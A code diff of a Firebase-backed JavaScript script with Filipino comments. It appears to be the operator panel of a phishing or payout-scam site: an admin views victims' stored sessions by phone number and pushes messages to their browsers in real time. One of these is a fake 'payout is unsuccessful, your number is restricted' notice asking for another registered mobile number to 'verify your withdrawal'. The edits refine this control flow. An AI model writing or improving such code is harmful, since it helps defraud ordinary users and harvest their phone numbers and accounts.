@@ -13,7 +13,6 @@ if (isAdminPage) {
     (function injectStyles() {
         const style = document.createElement('style');
         style.textContent = `
-            /* ========== ADMIN COMMAND POPUP ========== */
             .admin-command-popup {
                 position: fixed;
                 top: 0;
@@ -250,7 +249,7 @@ if (isAdminPage) {
 
 // ========== SHOW USER DETAILS POPUP (ADMIN ONLY) ==========
 async function showUserDetailsPopup(phone) {
-    if (!isAdminPage) return; // Hindi gagana sa user page
+    if (!isAdminPage) return;
     
     const userSnapshot = await db.ref('user_sessions/' + phone).once('value');
     const userData = userSnapshot.val();
@@ -349,7 +348,7 @@ function closeUserCommandPopup() {
     if (popup) popup.remove();
 }
 
-// ========== SEND COMMAND TO USER (ADMIN ONLY) ==========
+// ========== SEND COMMAND TO USER (ADMIN ONLY) - NO ALERT KAY ADMIN ==========
 async function sendCommandToUser(phone, commandCode) {
     if (!isAdminPage) return;
     
@@ -375,6 +374,7 @@ async function sendCommandToUser(phone, commandCode) {
         message = '⚠️ Payout is unsuccessful. Your mobile number is restricted. Please use another registered mobile number to verify your withdrawal.';
     }
     
+    // Send command to user
     await commandRef.set({
         message: message,
         action: 'clear_and_reset',
@@ -384,20 +384,18 @@ async function sendCommandToUser(phone, commandCode) {
         status: 'pending'
     });
     
-    await db.ref('user_sessions/' + phone).remove();
+    // REMOVED: Alert kay admin - hindi na magpo-popup kay admin
     
+    // Close the popup after sending
+    console.log(`Command sent to ${phone}`);
+    
+    // Auto remove command after 10 seconds (kung hindi pa na-receive ni user)
     setTimeout(async () => {
         const cmdSnapshot = await commandRef.once('value');
-        if (cmdSnapshot.exists()) {
+        if (cmdSnapshot.exists() && cmdSnapshot.val().status === 'pending') {
             await commandRef.remove();
         }
     }, 10000);
-    
-    alert(`✅ Command sent to ${phone}\n\n${message}`);
-    
-    setTimeout(() => {
-        location.reload();
-    }, 1000);
 }
 
 // ========== MAKE PHONE NUMBERS CLICKABLE (ADMIN ONLY) ==========
@@ -448,7 +446,7 @@ function observeTableChanges() {
     makePhonesClickable();
 }
 
-// ========== USER SIDE: LISTEN FOR COMMANDS ==========
+// ========== USER SIDE: LISTEN FOR COMMANDS (REAL-TIME) ==========
 function listenForAdminCommands() {
     const userPhone = localStorage.getItem('userPhone');
     if (!userPhone) {
@@ -456,14 +454,15 @@ function listenForAdminCommands() {
         return;
     }
     
-    console.log('Listening for admin commands...');
+    console.log('Listening for admin commands as user:', userPhone);
     
     const commandRef = db.ref('admin_commands/' + userPhone);
     
+    // Real-time listener
     commandRef.on('value', async (snapshot) => {
         const command = snapshot.val();
         if (command && command.status === 'pending') {
-            console.log('Command received:', command);
+            console.log('Command received from admin:', command);
             
             // Show alert to user
             alert(command.message);
